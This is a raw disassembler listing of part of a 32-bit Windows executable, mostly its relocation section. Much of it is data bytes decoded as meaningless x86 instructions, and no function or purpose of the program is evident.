  40abb4:	(bad)
  40abb8:	mov    BYTE PTR [eax-0x7f877078],cl
  40abbe:	add    BYTE PTR [eax],al
  40abc0:	add    BYTE PTR [eax],al
  40abc2:	add    BYTE PTR [eax],al
  40abc4:	(bad)  
  40abc5:	ja     0x40ac3e
  40abc7:	ja     0x40ac40
  40abc9:	ja     0x40ac42
  40abcb:	ja     0x40ac45
  40abcd:	add    BYTE PTR [eax],0x0
  40abd0:	add    BYTE PTR [eax],al
  40abd2:	add    BYTE PTR [eax],al
  40abd4:	or     bh,bh
  40abd6:	(bad)  
  40abd7:	(bad)  
  40abd8:	(bad)  
  40abd9:	(bad)  
  40abda:	(bad)  
  40abdb:	(bad)  
  40abdc:	clc    
  40abdd:	add    BYTE PTR [eax],0x0
  40abe0:	add    BYTE PTR [eax],al
  40abe2:	add    BYTE PTR [eax],al
  40abe4:	add    BYTE PTR [edi+0x77777777],al
  40abea:	ja     0x40ac63
  40abec:	jg     0x40ab6e
  40abee:	add    BYTE PTR [eax],al
  40abf0:	add    BYTE PTR [eax],al
  40abf2:	add    BYTE PTR [eax],al
  40abf4:	add    BYTE PTR [eax],cl
  40abf6:	mov    BYTE PTR [eax-0x77777778],cl
  40abfc:	mov    BYTE PTR [eax+0x7fc00000],al
  40ac02:	add    BYTE PTR [edi],bh
  40ac04:	sar    BYTE PTR [edi],0x80
  40ac07:	pop    ds
  40ac08:	rcr    BYTE PTR [edi],0xc0
  40ac0b:	xadd   BYTE PTR [edi],cl
  40ac0e:	loopne 0x40ac17
  40ac10:	rol    BYTE PTR [edi],0xf0
  40ac13:	add    eax,eax
  40ac15:	add    edi,edi
  40ac17:	inc    eax
  40ac19:	add    edi,edi
  40ac1b:	inc    eax
  40ac1d:	add    BYTE PTR [eax],al
  40ac1f:	xadd   BYTE PTR [eax],al
  40ac22:	add    BYTE PTR [edi],al
  40ac24:	rol    BYTE PTR [eax],0x0
  40ac27:	add    eax,eax
  40ac29:	add    BYTE PTR [eax],al
  40ac2b:	add    eax,eax
  40ac2d:	add    BYTE PTR [eax],al
  40ac2f:	add    al,al
  40ac31:	add    BYTE PTR [eax],al
  40ac33:	add    al,al
  40ac35:	add    BYTE PTR [eax],al
  40ac37:	add    BYTE PTR [eax+0x0],al
	...
  40ac45:	add    BYTE PTR [eax],al
  40ac47:	add    DWORD PTR [eax-0x3df10000],eax
  40ac4d:	add    BYTE PTR [eax],al
  40ac4f:	pavgw  mm0,QWORD PTR [eax]
  40ac52:	add    BYTE PTR [edi],cl
  40ac54:	repz add BYTE PTR [eax],al
  40ac57:	ud0    eax,DWORD PTR [eax]
  40ac5a:	add    BYTE PTR [edi],cl
  40ac5c:	inc    DWORD PTR [eax]
  40ac5e:	add    BYTE PTR [edi],cl
  40ac60:	inc    DWORD PTR [eax]
  40ac62:	add    BYTE PTR [edi],cl
  40ac64:	inc    DWORD PTR [eax]
  40ac66:	add    BYTE PTR [edi],cl
  40ac68:	inc    DWORD PTR [eax]
  40ac6a:	add    BYTE PTR [edi],cl
  40ac6c:	inc    DWORD PTR [eax]
  40ac6e:	add    BYTE PTR [edi],cl
  40ac70:	inc    DWORD PTR [eax]
  40ac72:	add    BYTE PTR [edi],cl
  40ac74:	inc    DWORD PTR [eax-0x3f00f100]
  40ac7a:	add    BYTE PTR [edi],cl
  40ac7c:	jmp    eax
  40ac7e:	add    BYTE PTR [edi],bl
  40ac80:	add    BYTE PTR [eax],al
  40ac82:	add    DWORD PTR [eax],eax
  40ac84:	add    DWORD PTR [eax],eax
  40ac86:	and    BYTE PTR [eax],ah
  40ac88:	adc    BYTE PTR [eax],al
  40ac8a:	add    DWORD PTR [eax],eax
  40ac8c:	add    al,0x0
  40ac8e:	call   0x140ac95
  40ac93:	add    BYTE PTR [eax],al
  40ac95:	add    BYTE PTR [eax],al
  40ac97:	add    ch,cl
  40ac99:	dec    ch
  40ac9b:	(bad)  
  40ac9c:	fadd   DWORD PTR [eax]
  40ac9e:	add    BYTE PTR [eax],al
  40aca0:	add    BYTE PTR [eax],al
  40aca2:	add    DWORD PTR [eax],eax
  40aca4:	add    BYTE PTR [eax],al
  40aca6:	add    BYTE PTR [eax],al
  40aca8:	adc    DWORD PTR [eax],eax
  40acaa:	add    BYTE PTR [eax],al
  40acac:	add    BYTE PTR [eax],al
  40acae:	add    BYTE PTR [eax],al
  40acb0:	add    al,BYTE PTR [eax]
  40acb2:	add    BYTE PTR [eax],al
  40acb4:	cmp    eax,0x97a7fad
  40acb9:	lock mov dl,0xbc
  40acbc:	dec    edi
  40acbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acbe:	push   0x22
  40acc0:	cld    
  40acc1:	cmp    bh,dh
  40acc3:	jne    0x40ad1b
  40acc5:	jmp    0x90fd:0x869a7fee
  40accc:	imul   edx
  40acce:	aam    0x63
  40acd0:	mov    ds:0x34cddf,eax
	...
  40ace9:	add    BYTE PTR [eax],al
  40aceb:	add    BYTE PTR [eax+0xe000000],cl
  40acf1:	add    BYTE PTR [eax],al
  40acf3:	add    BYTE PTR [eax+0x10000000],bl
  40acf9:	add    BYTE PTR [eax],al
  40acfb:	add    BYTE PTR [eax+0xe000000],ch
  40ad01:	add    BYTE PTR [eax],al
  40ad03:	add    BYTE PTR [eax+0xc000000],bh
	...
  40ad11:	add    BYTE PTR [eax],al
  40ad13:	add    al,cl
  40ad15:	add    BYTE PTR [eax],al
  40ad17:	add    BYTE PTR [eax+eax*1],cl
  40ad1a:	add    BYTE PTR [eax],al
  40ad1c:	add    BYTE PTR [eax],al
  40ad1e:	add    BYTE PTR [eax],al
  40ad20:	dec    ebp
  40ad21:	add    BYTE PTR [ebp+0x0],dl
  40ad24:	dec    ecx
	...
  40ad2d:	add    BYTE PTR [eax],al
  40ad2f:	add    BYTE PTR [ebx],al
  40ad31:	add    BYTE PTR [eax],al
  40ad33:	add    BYTE PTR [esi],cl
  40ad35:	add    BYTE PTR [eax],al
  40ad37:	add    BYTE PTR [eax],dl
  40ad39:	add    BYTE PTR [eax],al
  40ad3b:	add    BYTE PTR [eax],bl
  40ad3d:	add    BYTE PTR [eax],al
  40ad3f:	add    BYTE PTR [ebp+0x0],cl
  40ad42:	push   ebp
  40ad43:	add    BYTE PTR [ecx+0x0],cl
	...
  40ad4e:	add    BYTE PTR [eax],al
  40ad50:	add    eax,0x6000000
  40ad55:	add    BYTE PTR [eax],al
  40ad57:	add    BYTE PTR [eax],dl
  40ad59:	add    BYTE PTR [eax],al
  40ad5b:	add    BYTE PTR [eax],al
  40ad5d:	add    BYTE PTR [eax],al
  40ad5f:	add    BYTE PTR [ebp+0x0],ah
  40ad62:	outs   dx,BYTE PTR ds:[esi]
  40ad63:	add    BYTE PTR ds:0x53005500,ch
  40ad69:	add    BYTE PTR [eax],al
  40ad6b:	add    BYTE PTR [eax],al
  40ad6d:	add    BYTE PTR [eax],al
	...

Disassembly of section .reloc:

0040b000 <.reloc>:
  40b000:	add    BYTE PTR [eax],dl
  40b002:	add    BYTE PTR [eax],al
  40b004:	test   BYTE PTR [eax],al
  40b006:	add    BYTE PTR [eax],al
  40b008:	add    al,0x30
  40b00a:	or     BYTE PTR [eax],dh
  40b00c:	adc    al,0x30
  40b00e:	sbb    BYTE PTR [eax],dh
  40b010:	loopne 0x40b042
  40b012:	in     al,0x30
  40b014:	add    BYTE PTR [ebx],dh
  40b016:	add    al,0x33
  40b018:	or     BYTE PTR [ebx],dh
  40b01a:	or     al,0x33
  40b01c:	adc    BYTE PTR [ebx],dh
  40b01e:	adc    al,0x33
  40b020:	sbb    BYTE PTR [ebx],dh
  40b022:	sbb    al,0x33
  40b024:	and    BYTE PTR [ebx],dh
  40b026:	and    al,0x33
  40b028:	sub    BYTE PTR [ebx],dh
  40b02a:	sub    al,0x33
  40b02c:	xor    BYTE PTR [ebx],dh
  40b02e:	xor    al,0x33
  40b030:	cmp    BYTE PTR [ebx],dh
  40b032:	cmp    al,0x33
  40b034:	inc    eax
  40b035:	xor    eax,DWORD PTR [ebx+esi*1+0x48]
  40b039:	xor    ecx,DWORD PTR [ebx+esi*1+0x50]
  40b03d:	xor    edx,DWORD PTR [ebx+esi*1+0x58]
  40b041:	xor    ebx,DWORD PTR [ebx+esi*1+0x60]
  40b045:	xor    esp,DWORD PTR [ebx+esi*1+0x68]
  40b049:	xor    ebp,DWORD PTR [ebx+esi*1+0x70]
  40b04d:	xor    esi,DWORD PTR [ebx+esi*1+0x78]
  40b051:	xor    edi,DWORD PTR [ebx+esi*1-0x80]
  40b055:	xor    eax,DWORD PTR [ebx+esi*1+0x338c3388]
  40b05c:	pusha  
  40b05d:	cmp    bh,BYTE PTR [eax+0x3a]
  40b060:	mov    WORD PTR [edx],?
  40b062:	xchg   esp,eax
  40b063:	cmp    ah,BYTE PTR [eax-0x43c54bc6]
  40b069:	cmp    al,BYTE PTR [ebx+edi*1+0x3b943b88]
  40b070:	lods   al,BYTE PTR ds:[esi]
  40b071:	cmp    esi,DWORD PTR [ebx+edi*1+0x3dc03bbc]
  40b078:	enter  0xd03d,0x3d
  40b07c:	add    al,0x3f
  40b07e:	or     BYTE PTR [edi],bh
  40b080:	adc    BYTE PTR [edi],bh
  40b082:	sbb    BYTE PTR [edi],bh
  40b084:	add    BYTE PTR [eax],ah
  40b086:	add    BYTE PTR [eax],al
  40b088:	xchg   esp,eax
  40b089:	add    DWORD PTR [eax],eax
  40b08b:	add    BYTE PTR [edx+0x31],dh
  40b08e:	jbe    0x40b0c1
  40b090:	jl     0x40b0c3
  40b092:	xor    BYTE PTR [ecx],0x86
  40b095:	xor    DWORD PTR [edx-0x50ce61cf],ecx
  40b09b:	xor    DWORD PTR [esi-0x3cce43cf],esi
  40b0a1:	xor    ecx,ecx
  40b0a3:	xor    eax,edx
  40b0a5:	xor    esi,edx
  40b0a7:	xor    ebp,ebx
  40b0a9:	xor    ebx,esp
  40b0ab:	xor    edx,ebp
  40b0ad:	xor    ecx,esi
  40b0af:	xor    esp,edi
  40b0b1:	xor    DWORD PTR [eax],edx
  40b0b3:	xor    ah,BYTE PTR ds:0x3b322a32
  40b0b9:	xor    al,BYTE PTR [eax+0x32]
  40b0bc:	inc    esi
  40b0bd:	xor    dl,BYTE PTR [eax+0x32]
  40b0c0:	push   esi
  40b0c1:	xor    bl,BYTE PTR [edi+0x32]
  40b0c4:	xor    ch,BYTE PTR fs:[ecx+0x32]
  40b0c8:	jb     0x40b0fc
  40b0ca:	jnp    0x40b0fe
  40b0cc:	xor    DWORD PTR [edx],0xffffff8c
  40b0cf:	xor    bh,BYTE PTR [ecx+0x132c532]
  40b0d5:	xor    edx,DWORD PTR [ecx+0x33]
  40b0d8:	jo     0x40b10d
  40b0da:	scas   eax,DWORD PTR es:[edi]
  40b0db:	xor    eax,eax
  40b0dd:	xor    eax,DWORD PTR [edi]
  40b0df:	xor    al,0x1c
  40b0e1:	xor    al,0x3e
  40b0e3:	xor    al,0x56
  40b0e5:	xor    al,0x66
  40b0e7:	xor    al,0x74
  40b0e9:	xor    al,0xcd
  40b0eb:	xor    al,0xde
  40b0ed:	xor    al,0xe7
  40b0ef:	xor    al,0xf0
  40b0f1:	xor    al,0xfa
  40b0f3:	xor    al,0x9
  40b0f5:	xor    eax,0x3557353c
  40b0fa:	js     0x40b131
  40b0fc:	test   al,0x35
  40b0fe:	mov    al,0x35
  40b100:	int3   
  40b101:	xor    eax,0x35dc35d3
  40b106:	call   0x1176a540
  40b10b:	ss pop ss
  40b10d:	ss daa 
  40b10f:	ss cs ss cmp eax,0x6d364436
  40b117:	ss jns 0x40b150
  40b11a:	xchg   ecx,eax
  40b11b:	ss lahf 
  40b11d:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40b11f:	ss stos BYTE PTR es:[edi],al
  40b121:	ss mov al,0x36
  40b124:	retf   
  40b125:	shl    BYTE PTR ss:[esi],cl
  40b128:	(bad)  [esi]
  40b12a:	jmp    0x1777a165
  40b12f:	aaa    
  40b130:	sub    esi,DWORD PTR [edi]
  40b132:	inc    edx
  40b133:	aaa    
  40b134:	dec    eax
  40b135:	aaa    
  40b136:	push   ecx
  40b137:	aaa    
  40b138:	pop    esi
  40b139:	aaa    
  40b13a:	lea    esi,[edi]
  40b13c:	xchg   esi,eax
  40b13d:	aaa    
  40b13e:	mov    al,ds:0xd837aa37
  40b143:	aaa    
  40b144:	or     BYTE PTR [eax],bh
  40b146:	(bad)  
  40b149:	cmp    BYTE PTR ds:0x52384438,dh
  40b14f:	cmp    BYTE PTR [eax+edi*1+0x7f],dh
  40b153:	cmp    BYTE PTR [ecx-0x5ac766c8],cl
  40b159:	cmp    BYTE PTR [edx-0x35c744c8],ch
  40b15f:	cmp    cl,dl
  40b161:	cmp    bh,dl
  40b163:	cmp    cl,ah
  40b165:	cmp    dh,dh
  40b167:	cmp    BYTE PTR [ecx+edi*1],dl
  40b16a:	sbb    edi,DWORD PTR [ecx]
  40b16c:	and    DWORD PTR [ecx],edi
  40b16e:	sub    BYTE PTR [ecx],bh
  40b170:	push   edx
  40b171:	cmp    DWORD PTR [edi+0x39],ebp
  40b174:	mov    DWORD PTR [ecx],edi
  40b176:	pushf  
  40b177:	cmp    DWORD PTR [ebp-0x2cc642c7],esp
  40b17d:	cmp    ecx,esi
  40b17f:	cmp    DWORD PTR [eax],ebx
  40b181:	cmp    ch,BYTE PTR [ebp+0x3a]
  40b184:	jp     0x40b1c0
  40b186:	cmp    BYTE PTR [edx],0x87
  40b189:	cmp    bh,BYTE PTR [edx+edi*1+0x3ad03ac7]
  40b190:	fnstcw WORD PTR [edx]
  40b192:	loop   0x40b1ce
  40b194:	jmp    0x63a:0xf63af03a
  40b19b:	cmp    edx,DWORD PTR [ebx]
  40b19d:	cmp    esp,DWORD PTR [edx]
  40b19f:	cmp    esi,DWORD PTR [eax]
  40b1a1:	cmp    edi,DWORD PTR [edx]
  40b1a3:	cmp    eax,DWORD PTR [eax+0x3b]
  40b1a6:	dec    edx
  40b1a7:	cmp    edx,DWORD PTR [ecx+0x3b]
  40b1aa:	push   0x7f3bcf3b
  40b1af:	cmp    al,0x8a
  40b1b1:	cmp    al,0x92
  40b1b3:	cmp    al,0x9c
  40b1b5:	cmp    al,0xa3
  40b1b7:	cmp    al,0xb5
  40b1b9:	cmp    al,0x4
  40b1bb:	cmp    eax,0x3d1b3d0e
  40b1c0:	and    bh,BYTE PTR ds:0x3d363d2f
  40b1c6:	inc    ebx
  40b1c7:	cmp    eax,0x3d573d4a
  40b1cc:	pop    esi
  40b1cd:	cmp    eax,0x3daa3da1
  40b1d2:	mov    edi,0xd43dc83d
  40b1d7:	cmp    eax,0x3dfb3def
  40b1dc:	push   es
  40b1dd:	ds pop ss
  40b1df:	ds xor al,0x3e
  40b1e2:	inc    edi
  40b1e3:	ds pop ebp
  40b1e5:	imul   edi,DWORD PTR ds:[esi],0x73
  40b1e9:	ds call 0xcf3e:0xc93ebb3e
  40b1f1:	xlat   BYTE PTR ds:[ebx]
  40b1f3:	fnstsw WORD PTR ds:[esi]
  40b1f6:	jecxz  0x40b236
  40b1f8:	out    dx,eax
  40b1f9:	ds (bad) 
  40b1fb:	ds add eax,0x173f0f3f
  40b201:	aas    
  40b202:	sub    DWORD PTR [edi],edi
  40b204:	xor    al,0x3f
  40b206:	cmp    bh,BYTE PTR [edi]
  40b208:	jbe    0x40b249
  40b20a:	mov    DWORD PTR [edi],edi
  40b20c:	mov    dl,0x3f
  40b20e:	mov    edx,0xcd3fc73f
  40b213:	aas    
  40b214:	aam    0x3f
  40b216:	add    BYTE PTR [eax],al
  40b218:	add    BYTE PTR [eax],dh
  40b21a:	add    BYTE PTR [eax],al
  40b21c:	sbb    BYTE PTR [ecx],al
  40b21e:	add    BYTE PTR [eax],al
  40b220:	div    DWORD PTR [eax]
  40b222:	std    
  40b223:	xor    BYTE PTR [eax],cl
  40b225:	xor    DWORD PTR ds:0x17311231,ecx
  40b22b:	xor    DWORD PTR ds:0x36313031,ebx
  40b231:	xor    DWORD PTR [ecx+esi*1],edi
  40b234:	push   esp
  40b235:	xor    DWORD PTR [eax-0x38ce41cf],ebp
  40b23b:	xor    ebp,ecx
  40b23d:	xor    esp,ebx
  40b23f:	xor    DWORD PTR [edi],ebp
  40b241:	xor    bh,BYTE PTR [eax+0x32]
  40b244:	ret    
  40b245:	xor    bl,bl
  40b247:	xor    bh,dl
  40b249:	xor    cl,BYTE PTR [edi+0x33]
  40b24c:	bound  esi,QWORD PTR [ebx]
  40b24e:	outs   dx,BYTE PTR ds:[esi]
  40b24f:	xor    edx,ebx
  40b251:	xor    ebx,ecx
  40b253:	xor    eax,DWORD PTR [edx]
  40b255:	xor    al,0x7
  40b257:	xor    al,0x12
  40b259:	xor    al,0x56
  40b25b:	xor    al,0x82
  40b25d:	xor    al,0x8c
  40b25f:	xor    al,0x98
  40b261:	xor    al,0xa9
  40b263:	xor    al,0xb5
  40b265:	xor    al,0xba
  40b267:	xor    al,0xbf
  40b269:	xor    al,0xca
  40b26b:	xor    al,0xfa
  40b26d:	xor    al,0x24
  40b26f:	xor    eax,0x3556352b
  40b274:	fs xor eax,0x35843573
  40b27a:	pushf  
  40b27b:	xor    eax,0x3673363a
  40b280:	xor    DWORD PTR [esi],0xffffff8c
  40b283:	ss cwde 
  40b285:	ss mov esi,0xe836db36
  40b28b:	ss (bad) 
  40b28d:	ss add al,0x37
  40b290:	or     eax,0x20371437
  40b295:	aaa    
  40b296:	xor    BYTE PTR [edi],dh
  40b298:	jb     0x40b2d1
  40b29a:	mov    DWORD PTR [edi],esi
  40b29c:	scas   al,BYTE PTR es:[edi]
  40b29d:	aaa    
  40b29e:	shl    BYTE PTR [edi],cl
  40b2a0:	in     eax,0x37
  40b2a2:	inc    ebx
  40b2a3:	cmp    BYTE PTR [edi-0x30c757c8],al
  40b2a9:	cmp    dl,bh
  40b2ab:	cmp    BYTE PTR [edx],ah
  40b2ad:	cmp    DWORD PTR ds:0x50394639,ebp
  40b2b3:	cmp    DWORD PTR [ebp+0x39],edi
  40b2b6:	cmp    DWORD PTR [ecx],0xffffff9c
  40b2b9:	cmp    esi,eax
  40b2bb:	cmp    esp,edx
  40b2bd:	cmp    edx,esi
  40b2bf:	cmp    DWORD PTR [ebx+0x3a],ebx
  40b2c2:	cmp    BYTE PTR [edx],0xa1
  40b2c5:	cmp    ch,BYTE PTR [esi+0xa3af23a]
  40b2cb:	cmp    edx,DWORD PTR [ebx]
  40b2cd:	cmp    ebp,DWORD PTR [eax]
  40b2cf:	cmp    edi,DWORD PTR [edx]
  40b2d1:	cmp    eax,DWORD PTR [esi+0x3b]
  40b2d4:	pop    ebx
  40b2d5:	cmp    esp,DWORD PTR [ecx+0x3b]
  40b2d8:	jbe    0x40b315
  40b2da:	cmp    BYTE PTR [ebx],0x89
  40b2dd:	cmp    edx,DWORD PTR [esi-0x1fc42fc5]
  40b2e3:	cmp    esi,esi
  40b2e5:	cmp    esi,DWORD PTR [ecx]
  40b2e7:	cmp    al,0x65
  40b2e9:	cmp    al,0x7c
  40b2eb:	cmp    al,0x85
  40b2ed:	cmp    al,0x94
  40b2ef:	cmp    al,0x9c
  40b2f1:	cmp    al,0xb3
  40b2f3:	cmp    al,0xc1
  40b2f5:	cmp    al,0xca
  40b2f7:	cmp    al,0xe6
  40b2f9:	cmp    al,0xf8
  40b2fb:	cmp    al,0x1
  40b2fd:	cmp    eax,0x3d313d1c
  40b302:	pop    eax
  40b303:	cmp    eax,0x3d733d6a
  40b308:	mov    edi,DWORD PTR ds:0x3dc63da0
  40b30e:	sbb    BYTE PTR [esi],bh
  40b310:	sub    BYTE PTR [esi],bh
  40b312:	xor    DWORD PTR [esi],edi
  40b314:	cmp    eax,0xb43e7b3e
  40b319:	xlat   BYTE PTR ds:[ebx]
  40b31b:	or     edi,DWORD PTR ds:[edi]
  40b31e:	xor    eax,0x883f703f
  40b323:	aas    
  40b324:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b325:	aas    
  40b326:	lods   eax,DWORD PTR ds:[esi]
  40b327:	aas    
  40b328:	mov    ecx,0xfa3fca3f
  40b32d:	aas    
  40b32e:	add    BYTE PTR [eax],al
  40b330:	add    BYTE PTR [eax+0x0],al
  40b333:	add    ah,bh
  40b335:	add    BYTE PTR [eax],al
  40b337:	add    BYTE PTR [eax+esi*1],ch
  40b33a:	jns    0x40b36c
  40b33c:	mov    bl,0x30
  40b33e:	fidiv  WORD PTR [eax]
  40b340:	cli    
  40b341:	xor    BYTE PTR [ecx+esi*1],bh
  40b344:	jl     0x40b377
  40b346:	xchg   ebx,eax
  40b347:	xor    DWORD PTR [edi+0x1731a531],ebx
  40b34d:	xor    cl,BYTE PTR [ecx+0x33]
  40b350:	dec    edi
  40b351:	xor    edx,DWORD PTR [ebp+0x33]
  40b354:	jge    0x40b389
  40b356:	lahf   
  40b357:	xor    ebx,edx
  40b359:	xor    esp,DWORD PTR [ebx]
  40b35b:	xor    al,0x38
  40b35d:	xor    al,0x41
  40b35f:	xor    al,0x4f
  40b361:	xor    al,0xab
  40b363:	xor    al,0xb7
  40b365:	xor    al,0xc6
  40b367:	xor    al,0xee
  40b369:	xor    al,0xf8
  40b36b:	xor    al,0x0
  40b36d:	xor    eax,0x355a3525
  40b372:	push   0x35
  40b374:	mov    esp,0x635d235
  40b379:	ss or  al,0x36
  40b37c:	adc    dh,BYTE PTR [esi]
  40b37e:	sub    esi,DWORD PTR [esi]
  40b380:	dec    esi
  40b381:	ss xchg edx,eax
  40b383:	lods   al,BYTE PTR ss:[esi]
  40b385:	ss mov ch,0x36
  40b388:	(bad)  
  40b389:	ss out 0x36,al
  40b38c:	std    
  40b38d:	ss or  eax,0x31372637
  40b393:	aaa    
  40b394:	imul   esi,DWORD PTR [edi],0x37883776
  40b39a:	xchg   ebp,eax
  40b39b:	aaa    
  40b39c:	call   0xd137:0xcc37bf37
  40b3a3:	aaa    
  40b3a4:	cli    
  40b3a5:	aaa    
  40b3a6:	pop    es
  40b3a7:	cmp    BYTE PTR [esi],bl
  40b3a9:	cmp    BYTE PTR [edi],ah
  40b3ab:	cmp    BYTE PTR [eax+edi*1],ch
  40b3ae:	push   eax
  40b3af:	cmp    BYTE PTR [ecx+0x38],bl
  40b3b2:	pop    esi
  40b3b3:	cmp    BYTE PTR [edi+0x38],ch
  40b3b6:	mov    ds:0xdb38c838,al
  40b3bb:	cmp    BYTE PTR [ecx+edi*1],al
  40b3be:	cmp    DWORD PTR es:[eax+0x39],ecx
  40b3c2:	sar    BYTE PTR [ecx],0x0
  40b3c5:	cmp    dl,BYTE PTR [edx+0x3a]
  40b3c8:	jo     0x40b404
  40b3ca:	mov    esp,0xd63ad03a
  40b3cf:	cmp    bl,ah
  40b3d1:	cmp    ah,dl
  40b3d3:	cmp    bh,al
  40b3d5:	cmp    al,BYTE PTR [eax]
  40b3d7:	cmp    eax,DWORD PTR [ebp+0x3b]
  40b3da:	pop    ebp
  40b3db:	cmp    esi,DWORD PTR [ebx+edi*1-0x6f]
  40b3df:	cmp    edi,DWORD PTR [ecx-0x2cc439c5]
  40b3e5:	cmp    ebp,ebx
  40b3e7:	cmp    esi,esp
  40b3e9:	cmp    eax,DWORD PTR [ecx]
  40b3eb:	cmp    al,0xc
  40b3ed:	cmp    al,0x19
  40b3ef:	cmp    al,0x22
  40b3f1:	cmp    al,0x45
  40b3f3:	cmp    al,0x50
  40b3f5:	cmp    al,0x6b
  40b3f7:	cmp    al,0x7e
  40b3f9:	cmp    al,0x9c
  40b3fb:	cmp    al,0xf8
  40b3fd:	cmp    al,0x12
  40b3ff:	cmp    eax,0x3d2d3d28
  40b404:	cmp    edi,DWORD PTR ds:0x3d583d4a
  40b40a:	je     0x40b449
  40b40c:	mov    BYTE PTR ds:0x3dc53dac,bh
  40b412:	in     al,dx
  40b413:	cmp    eax,0x3e443e0f
  40b418:	push   ecx
  40b419:	cmp    DWORD PTR ds:[esi],0x3ebe3e97
  40b420:	std    
  40b421:	sub    edi,DWORD PTR ds:[edi]
  40b424:	fnstcw WORD PTR [edi]
  40b426:	fistp  QWORD PTR [edi]
  40b428:	out    0x3f,al
  40b42a:	in     eax,dx
  40b42b:	aas    
  40b42c:	add    BYTE PTR [eax+0x0],dl
  40b42f:	add    al,dh
  40b431:	add    BYTE PTR [eax],al
  40b433:	add    BYTE PTR [edi],cl
  40b435:	xor    BYTE PTR [esi],dl
  40b437:	xor    BYTE PTR ds:0x48302430,bl
  40b43d:	xor    BYTE PTR [eax+esi*1+0x61],bl
  40b441:	xor    BYTE PTR [edx+0x30],ch
  40b444:	xor    DWORD PTR [eax],0xffffff96
  40b447:	xor    BYTE PTR [eax+esi*1+0x30fc30c3],ch
  40b44e:	add    eax,0x6b313631
  40b453:	xor    DWORD PTR [edx-0x14ce47cf],esp
  40b459:	xor    DWORD PTR [edx],ecx
  40b45b:	xor    dh,BYTE PTR [esi]
  40b45d:	xor    dh,BYTE PTR [ebp+0x32]
  40b460:	mov    ds:0x4f332532,al
  40b465:	xor    ebx,DWORD PTR [ebx+esi*1+0x7f]
  40b469:	xor    ebx,DWORD PTR [ebx+esi*1+0x33f633c9]
  40b470:	and    BYTE PTR [edx*2+0x7f346434],dh
  40b477:	xor    al,0x8b
  40b479:	xor    al,0x9f
  40b47b:	xor    al,0xad
  40b47d:	xor    al,0x52
  40b47f:	xor    eax,0x3583357a
  40b484:	xchg   esi,eax
  40b485:	xor    eax,0x362d35a1
  40b48a:	inc    ecx
  40b48b:	ss xor WORD PTR ss:[esi],0x36f5
  40b492:	cld    
  40b493:	add    esi,DWORD PTR ss:[edi]
  40b496:	adc    dh,BYTE PTR [edi]
  40b498:	and    BYTE PTR [edi],dh
  40b49a:	dec    esi
  40b49b:	aaa    
  40b49c:	jae    0x40b4d5
  40b49e:	jge    0x40b4d7
  40b4a0:	test   BYTE PTR [edi],dh
  40b4a2:	mov    esi,DWORD PTR [edi]
  40b4a4:	fwait
  40b4a5:	aaa    
  40b4a6:	stos   BYTE PTR es:[edi],al
  40b4a7:	aaa    
  40b4a8:	mov    al,0x37
  40b4aa:	lds    esi,FWORD PTR [edi]
  40b4ac:	shl    BYTE PTR [edi],1
  40b4ae:	in     eax,0x37
  40b4b0:	cli    
  40b4b1:	aaa    
  40b4b2:	adc    al,0x38
  40b4b4:	xor    DWORD PTR [eax],edi
  40b4b6:	push   esi
  40b4b7:	cmp    BYTE PTR [eax+edi*1+0x392938f4],bl
  40b4be:	imul   edi,DWORD PTR [ecx],0x7f
  40b4c1:	cmp    DWORD PTR [ebx+0x1939bf39],edx
  40b4c7:	cmp    ah,BYTE PTR [esi]
  40b4c9:	cmp    dh,BYTE PTR [ecx]
  40b4cb:	cmp    bh,ah
  40b4cd:	cmp    cl,BYTE PTR [ecx]
  40b4cf:	cmp    edi,DWORD PTR [ebx+edi*1]
  40b4d2:	inc    ebp
  40b4d3:	cmp    esi,DWORD PTR [edx+0x3b]
  40b4d6:	lahf   
  40b4d7:	cmp    edi,DWORD PTR [eax+0x593bdf3b]
  40b4dd:	cmp    al,0x7c
  40b4df:	cmp    al,0x87
  40b4e1:	cmp    al,0x8e
  40b4e3:	cmp    al,0xb7
  40b4e5:	cmp    al,0xbf
  40b4e7:	cmp    al,0xdb
  40b4e9:	cmp    al,0x37
  40b4eb:	cmp    eax,0x3d713d67
  40b4f0:	ja     0x40b52f
  40b4f2:	cmp    DWORD PTR ds:0x3db73d95,0x3dcd3dc3
  40b4fc:	fidivr WORD PTR ds:0x3ded3de8
  40b502:	sti    
  40b503:	cmp    eax,0x3e373e0a
  40b508:	mov    bl,0x3e
  40b50a:	mov    eax,0x9e3ece3e
  40b50f:	aas    
  40b510:	mov    eax,0xd63fbf3f
  40b515:	aas    
  40b516:	in     eax,0x3f
  40b518:	sti    
  40b519:	aas    
  40b51a:	add    BYTE PTR [eax],al
  40b51c:	add    BYTE PTR [eax+0x0],ah
  40b51f:	add    BYTE PTR [ecx+eax*1],bh
  40b522:	add    BYTE PTR [eax],al
  40b524:	push   ds
  40b525:	xor    BYTE PTR [edx],ch
  40b527:	xor    BYTE PTR [esi],dh
  40b529:	xor    BYTE PTR [eax+0x30],cl
  40b52c:	push   esp
  40b52d:	xor    BYTE PTR [edx+0x30],bl
  40b530:	xor    BYTE PTR [di+0x30],bh
  40b534:	xchg   BYTE PTR [eax],dh
  40b536:	nop
  40b537:	xor    BYTE PTR [ecx-0x50cf5cd0],bl
  40b53d:	xor    BYTE PTR [ebp-0x3acf43d0],dh
  40b543:	xor    bl,cl
  40b545:	xor    bl,dl
  40b547:	xor    cl,bl
  40b549:	xor    dh,ah
  40b54b:	xor    dh,ch
  40b54d:	xor    ah,dh
  40b54f:	xor    BYTE PTR [ecx],dl
  40b551:	xor    DWORD PTR [esi],edx
  40b553:	xor    DWORD PTR [ecx+esi*1],ebx
  40b556:	and    DWORD PTR [ecx],esi
  40b558:	xor    DWORD PTR es:[ebx],ebp
  40b55b:	xor    DWORD PTR [eax],esi
  40b55d:	xor    DWORD PTR [esi],esi
  40b55f:	xor    DWORD PTR [esi],edi
  40b561:	xor    DWORD PTR [ebx+0x31],ecx
  40b564:	bound  esi,QWORD PTR [ecx]
  40b566:	jg     0x40b599
  40b568:	xchg   edi,eax
  40b569:	xor    DWORD PTR [esi-0x40ce49cf],ebp
  40b56f:	xor    esp,eax
  40b571:	xor    ecx,ecx
  40b573:	xor    edi,ebx
  40b575:	xor    ebp,esp
  40b577:	xor    esp,ebp
  40b579:	xor    ecx,esi
  40b57b:	xor    esi,edi
  40b57d:	xor    DWORD PTR ds:0x1d321532,ecx
  40b583:	xor    dh,BYTE PTR [ebx]
  40b585:	xor    bh,BYTE PTR [ebx]
